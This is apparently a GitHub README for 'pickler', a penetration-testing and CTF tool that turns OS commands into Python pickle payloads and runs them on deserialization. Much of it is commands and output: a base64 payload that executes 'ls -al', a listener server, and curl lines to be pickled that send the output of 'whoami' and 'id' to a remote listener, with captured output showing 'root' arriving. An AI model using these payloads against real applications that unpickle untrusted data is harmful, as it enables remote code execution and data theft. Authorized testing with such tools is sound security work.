
<p align="center">
<img width="726" alt="Screen Shot 2022-09-29 at 4 26 00 PM" src="https://user-images.githubusercontent.com/1679089/193159292-a7525d0c-956e-4fdc-ad57-d2b323461339.png">
</p>


<h4 align="center">Pickler and Unpickler of OS Commands</h4>
<p align="center">
  <a href="https://twitter.com/sho_luv">
    <img src="https://img.shields.io/badge/Twitter-%40sho_luv-blue.svg">
    <img src="https://img.shields.io/badge/python-3+-blue.svg">
  </a>
</p>

# pickler

I created this tool to create pickled os commands to be used during CTFs and Penetration Tests. 
```bash
./pickling.py 
              .      
,-. . ,-. . , |  ,-. 
| | | |   |/  |  |-' 
|-' ' `-' |\  `' `-' 
|         ' `        
'                    

usage: pickling.py [-h] os_command

This script is used to pickle system commands.

positional arguments:
  os_command  operating system (OS) commands to run i.e. "ls -al"

options:
  -h, --help  show this help message and exit

```
# Pickler Usage:

```bash
./pickling.py "ls -al"
gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZscyAtYWyUhZRSlC4=
```
# Unpickler

```bash
./unpickling.py 
                      .      
. . ,-. ,-. . ,-. . , |  ,-. 
| | | | | | | |   |/  |  |-' 
`-' ' ' |-' ' `-' |\  `' `-' 
        |         ' `        
        '                    

usage: unpickling.py [-h] pickled_object

This script is used to execute pickled objects.

positional arguments:
  pickled_object  Pickled objects passed here will be executed on the system this script is ran on.

options:
  -h, --help      show this help message and exit

```


# Unpickler Usage:

Here you will notice when we unpickle the previously pickled "ls -al" command the program simply executes the pickled object. This is what allows the exploitation applications using pickles that accept untrusted data.

**Warning:** If you pickle a command like rm and then unpickle it you will be running the command rm on your system so be careful

```bash
./unpickling.py gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZscyAtYWyUhZRSlC4=
total 56
drwxr-xr-x 2 root root 4096 Sep 29 14:57 .
drwxr-xr-x 4 root root 4096 Sep 29 15:33 ..
-rwxr--r-- 1 root root 4555 Sep 29 12:24 command.py
-rwxr--r-- 1 root root 1025 Sep 29 14:57 pickling.py
-rwxr--r-- 1 root root 4397 Sep 29 14:11 rev_shell.py
-rwxr--r-- 1 root root  995 Sep 29 13:30 unpickling.py

Unpickled Object Successfully

```

# Python Server

I added a python server that will display the POST/GET requests. This comes in handy when I don't want to set up a real web server, however I want to see the posts requests that come in. This can be used with pickled objects like so: "curl -X POST -d \"$(whoami)\" http://<REMOTE-LISTNER>:9000/funtimes"

```bash
python server.py -h

 ,--.     .  .             .---.
 |__/ . . |- |-. ,-. ,-.   \___  ,-. ,-. .  , ,-. ,-.
 |    | | |  | | | | | |       \ |-' |   | /  |-' |
 '    `-| `' ' ' `-' ' '   `---' `-' '   `'   `-' '
        |
      `-'

usage: server.py [-h] [-p port]

This is a python server that captures displays GET or POST data

options:
  -h, --help  show this help message and exit
  -p port     Set the port you want the server to listen on, Default port: 9000

```
# Usage python server.py

```
sudo python server.py -p 90
Starting httpd...
Pickle this: curl -X POST -d "$(id)" http://192.168.86.34:90/FunTimes
INFO:root:POST request,
Path: /FunTimes
Headers:
Host: 192.168.86.34:90
User-Agent: curl/7.85.0
Accept: */*
Content-Length: 4
Content-Type: application/x-www-form-urlencoded



Body:
root

192.168.86.34 - - [29/Sep/2022 22:09:07] "POST /FunTimes HTTP/1.1" 200 -

```


